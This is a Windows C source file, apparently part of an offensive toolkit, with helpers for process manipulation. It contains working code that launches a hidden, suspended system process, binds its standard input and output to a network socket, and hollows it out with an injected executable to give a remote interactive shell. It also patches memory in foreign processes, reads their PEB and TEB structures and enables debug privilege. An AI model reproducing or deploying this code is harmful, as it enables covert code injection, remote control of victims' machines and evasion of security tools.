#include <stdio.h>

#include "file.h"
#include "privilege.h"
#include "process.h"
#include "processhollowing.h"
#include "utils.h"

#include <psapi.h>
#include <TlHelp32.h>

// Returns 0 on success else, the error code from GetLastError.
ULONG ProcessGetPeb(HANDLE hProcess, PPEB peb) {
	NTSTATUS(NTAPI *fpNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG)
		= (NTSTATUS(NTAPI *)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG))
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");
	if (fpNtQueryInformationProcess == NULL) {
		return 0;
	}

	PROCESS_BASIC_INFORMATION pbi;
	ZeroMemory(&pbi, sizeof(pbi));

	ULONG uRetLen = 0;
	NTSTATUS ntStatus = fpNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &uRetLen);
	if (!NT_SUCCESS(ntStatus)) {
		return (ULONG)ntStatus;
	}

	// PEB of the target process to read into.
	ZeroMemory(peb, sizeof(PEB));

	// Read the PEB of target process.
	SIZE_T dwRead = 0;
	if (ReadProcessMemory(hProcess, (PVOID)pbi.PebBaseAddress, peb, sizeof(PEB), &dwRead) == FALSE) {
		return GetLastError();
	}

	return ERROR_SUCCESS;
}

// Returns 0 on failure. Use GetLastError to retrieve error code.
PVOID ProcessGetBaseAddress(HANDLE hProcess) {
	PEB peb;
	ZeroMemory(&peb, sizeof(peb));

	ULONG uError = ProcessGetPeb(hProcess, &peb);
	if (uError != ERROR_SUCCESS) {
		SetLastError(uError);
		return 0;
	}
	
	// This is the base address.
	return (PVOID)peb.Reserved3[1];
}

ULONG ProcessCreateInteractiveSocketShellReflective(CONST SOCKET s, LPCBYTE lpBytes, LPWSTR lpArguments, LPPROCESS_INFORMATION pi) {
	// Set up process structures.
	STARTUPINFO si;
	ZeroMemory(&si, sizeof(si));

	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdError = si.hStdInput = si.hStdOutput = (HANDLE)s;
	si.wShowWindow = SW_HIDE;

	// Get directory of child
	WCHAR szSysDirectory[MAX_PATH + 1];
	GetSystemDirectory(szSysDirectory, MAX_PATH);

	// Append child
	SIZE_T nChildProcLen = wcslen(szSysDirectory) + wcslen(CHILD_EXE) + 1;
	LPWSTR szChildProc = _HeapAlloc(HEAP_ZERO_MEMORY, sizeof(WCHAR) * nChildProcLen);
	if (szChildProc == NULL) {
		return 1;
	}
	wcsncpy_s(szChildProc, nChildProcLen, szSysDirectory, _TRUNCATE);
	wcsncat_s(szChildProc + wcslen(szChildProc), nChildProcLen - wcslen(szChildProc), CHILD_EXE, _TRUNCATE);

	if (CreateProcess(szChildProc, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, pi) == FALSE) {
		return 2;
	}

	_HeapFree(szChildProc);

	return ProcessHollowFromMemory(pi->hProcess, pi->hThread, lpBytes);
}

// Wraps ProcessCreateInteractiveSocketShellReflective.
// Returns 0 on success, else -1.
ULONG ProcessCreateInteractiveSocketShell(CONST SOCKET s, LPWSTR lpExeName, LPWSTR lpArguments, LPPROCESS_INFORMATION pi) {
	LPBYTE lpFileData = NULL;
	ULONG uSuccess = ReadBytesFromFile(lpExeName, &lpFileData);
	if (uSuccess == -1) {
		return (ULONG)-1;
	}

	uSuccess = ProcessCreateInteractiveSocketShellReflective(s, lpFileData, lpArguments, pi);

	_HeapFree(lpFileData);

	return uSuccess;
}

ULONG ProcessCreateReflective(LPCBYTE lpBytes, LPWSTR lpArguments, LPPROCESS_INFORMATION pi) {
	// Set up process structures.
	STARTUPINFO si;
	ZeroMemory(&si, sizeof(si));

	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	// Get directory of child
	WCHAR szSysDirectory[MAX_PATH + 1];
	GetSystemDirectory(szSysDirectory, MAX_PATH);

	// Append child
	SIZE_T nChildProcLen = wcslen(szSysDirectory) + wcslen(CHILD_EXE) + 1;
	LPWSTR szChildProc = _HeapAlloc(HEAP_ZERO_MEMORY, sizeof(WCHAR) * nChildProcLen);
	if (szChildProc == NULL) {
		return (ULONG)-1;
	}
	wcscpy_s(szChildProc, nChildProcLen, szSysDirectory);
	wcsncat_s(szChildProc + wcslen(szChildProc), nChildProcLen - wcslen(szChildProc), CHILD_EXE, wcslen(CHILD_EXE));

	if (CreateProcess(szChildProc, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, pi) == FALSE) {
		return (ULONG)-1;
	}

	_HeapFree(szChildProc);

	return ProcessHollowFromMemory(pi->hProcess, pi->hThread, lpBytes);
}

// Returns handle to the process. hProcess can be NULL.
BOOL ProcessShellExecute(LPCWSTR lpFileName, LPCWSTR lpArguments, PHANDLE hProcess) {
	SHELLEXECUTEINFO sei;
	ZeroMemory(&sei, sizeof(sei));
	
	sei.cbSize = sizeof(sei);
	sei.lpFile = lpFileName;
	sei.lpParameters = lpArguments;
	// Hide window by default.
	sei.nShow = SW_HIDE;

	BOOL bSuccess = ShellExecuteEx(&sei);

	if (hProcess != NULL)
		*hProcess = sei.hProcess;

	return bSuccess;
}

// https://docs.microsoft.com/en-us/windows/desktop/psapi/enumerating-all-processes
// Returns TRUE on success else, FALSE. Use GetLastError to get error code.
// dwNumProcesses cannot be NULL.
// Since it's hard to predict the number of processes, it is recommended that dwProcessIds is
// initially sufficiently large enough to hold all potential processes. Use dwNumProcesses to identify
// if the number of relevant processes that have been enumerated with your dwProcessIds
// array size.
BOOL ProcessGetProcessIds(LPDWORD dwProcessIds, DWORD dwSizeInBytes, LPDWORD dwNumProcesses) {
	DWORD dwNeeded = 0;
	if (EnumProcesses(dwProcessIds, dwSizeInBytes, &dwNeeded) == FALSE) {
		return FALSE;
	}

	*dwNumProcesses = dwNeeded / sizeof(DWORD);

	return TRUE;
}

// Returns process handle on success else, NULL. Use GetLastError to get error code.
// Use CloseHandle to close the process handle.
HANDLE ProcessGetProcessById(DWORD dwProcessId, DWORD dwDesiredAccess) {
	return OpenProcess(dwDesiredAccess, FALSE, dwProcessId);
}

// https://docs.microsoft.com/en-us/windows/desktop/toolhelp/traversing-the-thread-list
// Returns 0 on success else, the error code of GetLastError.
// dwNumThreads cannot be NULL.
// Since it's hard to predict the number of threads, it is recommended that dwThreadIds is
// initially sufficiently large enough to hold all potential threads. Use dwNumThreads to identify
// if the number of relevant threads that have been enumerated with your dwThreadIds
// array size.
ULONG ProcessGetThreadIds(DWORD dwProcessId, LPDWORD dwThreadIds, DWORD dwSizeInBytes, LPDWORD dwNumThreads) {
	HANDLE hSnapshot = INVALID_HANDLE_VALUE;
	THREADENTRY32 te32;
	ULONG uError = ERROR_SUCCESS;

	// Take a snapshot of all running threads  
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return GetLastError();
	}

	// Fill in the size of the structure before using it. 
	te32.dwSize = sizeof(THREADENTRY32);

	// Retrieve information about the first thread,
	// and exit if unsuccessful
	if (Thread32First(hSnapshot, &te32) == FALSE) {
		uError = GetLastError();
		CloseHandle(hSnapshot);     // Must clean up the snapshot object!
		return uError;
	}

	// Initialise dwNumThreads to 0 just in case.
	*dwNumThreads = 0;

	// Now walk the thread list of the system,
	// and display information about each thread
	// associated with the specified process
	do {
		if (te32.th32OwnerProcessID == dwProcessId) {
			// Check if the dwThreadIds array has been exceeded.
			if (*dwNumThreads < dwSizeInBytes / sizeof(DWORD)) {
				dwThreadIds[*dwNumThreads] = te32.th32ThreadID;
			}

			// Keep a counter on how many relevant threads have been enumerated.
			*dwNumThreads = *dwNumThreads + 1;
		}
	} while (Thread32Next(hSnapshot, &te32) == TRUE);

	// Don't forget to clean up the snapshot object.
	CloseHandle(hSnapshot);
	
	return uError;
}

// Returns 0 on success else, the error code of GetLastError.
// Returns the base address of the thread's TEB.
ULONG ProcessThreadGetTeb(DWORD dwThreadId, PVOID *pTebBaseAddress) {
	ULONG uError = ERROR_SUCCESS;

	NTSTATUS(NTAPI *fpNtQueryInformationThread)(HANDLE, THREADINFOCLASS, PVOID, ULONG, PULONG)
		= (NTSTATUS(NTAPI *)(HANDLE, THREADINFOCLASS, PVOID, ULONG, PULONG))
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationThread");
	if (fpNtQueryInformationThread == NULL) {
		return GetLastError();
	}

	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, dwThreadId);
	if (hThread == NULL) {
		return GetLastError();
	}

	THREAD_BASIC_INFORMATION tbi;
	ZeroMemory(&tbi, sizeof(tbi));

	ULONG uRetLen = 0;
	if (!NT_SUCCESS(fpNtQueryInformationThread(hThread, ThreadBasicInformation, &tbi, sizeof(tbi), &uRetLen))) {
		uError = GetLastError();
		CloseHandle(hThread);
		return uError;
	}

	CloseHandle(hThread);
	*pTebBaseAddress = tbi.TebBaseAddress;

	return uError;
}

// https://wj32.org/wp/2010/03/30/howto-use-i_querytaginformation/
// Returns 0 on success, else the error value.
ULONG ProcessGetTagInformation(DWORD dwProcessId, ULONG uServiceTag, PSC_SERVICE_TAG_QUERY sstq) {
	HMODULE hAdvapi32 = LoadLibrary(L"advapi32.dll");
	if (hAdvapi32 == NULL) {
		return GetLastError();
	}

	NTSTATUS(NTAPI *fpI_QueryTagInformation)(PVOID, SC_SERVICE_TAG_QUERY_TYPE, PSC_SERVICE_TAG_QUERY)
		= (NTSTATUS(NTAPI *)(PVOID, SC_SERVICE_TAG_QUERY_TYPE, PSC_SERVICE_TAG_QUERY))
		GetProcAddress(hAdvapi32, "I_QueryTagInformation");
	if (fpI_QueryTagInformation == NULL) {
		FreeLibrary(hAdvapi32);
		return GetLastError();
	}

	sstq->ProcessId = (ULONG)dwProcessId;
	sstq->ServiceTag = (ULONG)uServiceTag;
	sstq->Unknown = 0;
	sstq->Buffer = NULL;

	NTSTATUS ntStatus = fpI_QueryTagInformation(NULL, ServiceNameFromTagInformation, sstq);

	FreeLibrary(hAdvapi32);

	return ntStatus;
}

// Returns 0 on success else, the error code from GetLastError.
// Returns the SubProcessTag in uSubProcessTag. uSubProcessTag cannot be NULL.
ULONG ProcessGetSubProcessTag(HANDLE hProcess, PVOID pTebAddress, PULONG uSubProcessTag) {
	// Read the SubProcessTag
	*uSubProcessTag = 0;
	SIZE_T nRead = 0;
	if (ReadProcessMemory(hProcess, (PVOID)((DWORD_PTR)pTebAddress + (DWORD_PTR)FIELD_OFFSET(TEB, SubProcessTag)), (PVOID)uSubProcessTag, sizeof(uSubProcessTag), &nRead) == FALSE) {
		return GetLastError();
	}

	return ERROR_SUCCESS;
}

// Returns 0 on success else, the error code from GetLastError.
ULONG ProcessGetSystemModuleBase(HANDLE hProcess, LPCWSTR szModuleName, HMODULE *hModule) {
	HMODULE hMods[1024];
	DWORD dwNeeded = 0;

	// https://docs.microsoft.com/en-us/windows/desktop/psapi/enumerating-all-modules-for-a-process
	// Get a list of modules from the target process.
	if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &dwNeeded) == FALSE) {
		return GetLastError();
	}

	// Iterate all modules.
	for (DWORD i = 0; i < dwNeeded / sizeof(HMODULE); i++) {
		// Get the full path of the module.
		WCHAR szModName[MAX_PATH];
		ZeroMemory(szModName, SIZEOF_ARRAY(szModName));
		GetModuleFileNameEx(hProcess, hMods[i], szModName, SIZEOF_ARRAY(szModName));

		// Get the system directory.
		WCHAR szSystemDirectory[MAX_PATH];
		ZeroMemory(szSystemDirectory, SIZEOF_ARRAY(szSystemDirectory));
		GetSystemDirectory(szSystemDirectory, SIZEOF_ARRAY(szSystemDirectory));

		// Append the module name
		SIZE_T nModFullPathLen = wcslen(szSystemDirectory) + wcslen(szModuleName) + 2;
		LPWSTR szModFullPath = _HeapAlloc(HEAP_ZERO_MEMORY, nModFullPathLen * sizeof(WCHAR));
		if (szModFullPath == NULL) {
			return GetLastError();
		}
		_snwprintf_s(szModFullPath, nModFullPathLen, nModFullPathLen, L"%s\\%s", szSystemDirectory, szModuleName);

		if (!_wcsnicmp(szModFullPath, szModName, wcslen(szModName))) {
			_HeapFree(szModFullPath);
			*hModule = hMods[i];
			break;
		}

		_HeapFree(szModFullPath);
	}

	return ERROR_SUCCESS;
}

// Returns 0 on success else, the error from GetLastError.
// Returns TRUE in bIsPatched if the patch was successful.
// lpOriginalPattern can be NULL in which nOriginalSize will be ignored.
ULONG ProcessPatchMemoryPattern(HANDLE hProcess, DWORD_PTR dwBaseAddress, DWORD_PTR dwEndAddress, DWORD_PTR dwOffset, LPCBYTE lpSearchPattern, SIZE_T nSearchSize, LPCBYTE lpReplacePattern, SIZE_T nReplaceSize, PBOOL bIsPatched) {
	// This is going to be terribly unoptimised.
	// My apologies!

	// Initialize bIsPatched.
	*bIsPatched = FALSE;

	// Allocate memory that is the same size as the pattern size 
	// to be read from the target process for pattern checking.
	LPBYTE lpReadPattern = _HeapAlloc(HEAP_ZERO_MEMORY, nSearchSize);
	if (lpReadPattern == NULL) {
		return GetLastError();
	}

	// Search for the first byte.
	for (DWORD_PTR i = dwBaseAddress; i < dwEndAddress; i++) {
		// Read the first byte.
		BYTE bFirst = 0;
		SIZE_T nRead = 0;
		if (ReadProcessMemory(hProcess, (LPCVOID)i, &bFirst, sizeof(bFirst), &nRead) == FALSE) {
			_HeapFree(lpReadPattern);
			return GetLastError();
		}

		// Check if the first byte of the pattern matches.
		if (bFirst == lpSearchPattern[0]) {
			// Reset just in case.
			ZeroMemory(lpReadPattern, nSearchSize);

			// Read the pattern.
			if (ReadProcessMemory(hProcess, (LPCVOID)i, (LPVOID)lpReadPattern, nSearchSize, &nRead) == FALSE) {
				_HeapFree(lpReadPattern);
				return GetLastError();
			}

			// Check the pattern.
			if (!memcmp(lpSearchPattern, lpReadPattern, nSearchSize)) {
				// Unprotect memory region for write.
				DWORD flOldProtect = 0;
				// TODO Fix and make this cleaner?
				if (VirtualProtectEx(hProcess, (LPVOID)(i + dwOffset), nReplaceSize, PAGE_EXECUTE_READWRITE, &flOldProtect) == FALSE) {
					_HeapFree(lpReadPattern);
					return GetLastError();
				}

				// Replace if pattern matches.
				if (WriteProcessMemory(hProcess, (LPVOID)(i + dwOffset), lpReplacePattern, nReplaceSize, NULL) == FALSE) {
					_HeapFree(lpReadPattern);
					return GetLastError();
				}

				// Reprotect memory region.
				if (VirtualProtectEx(hProcess, (LPVOID)(i + dwOffset), nReplaceSize, flOldProtect, &flOldProtect) == FALSE) {
					_HeapFree(lpReadPattern);
					return GetLastError();
				}

				// Set true.
				*bIsPatched = TRUE;
				break;
			}
		}
	}

	_HeapFree(lpReadPattern);

	return ERROR_SUCCESS;
}

// Returns 0 on success else, the error code from GetLastError.
ULONG ProcessSetPrivilege(HANDLE hProcess, LPCWSTR szPrivilege, BOOL bEnablePrivilege) {
	HANDLE hToken = NULL;

	if (OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &hToken) == FALSE) {
		return GetLastError();
	}

	PrivilegeSetPrivilege(hToken, SE_DEBUG_NAME, TRUE);
	CloseHandle(hToken);

	return ERROR_SUCCESS;
}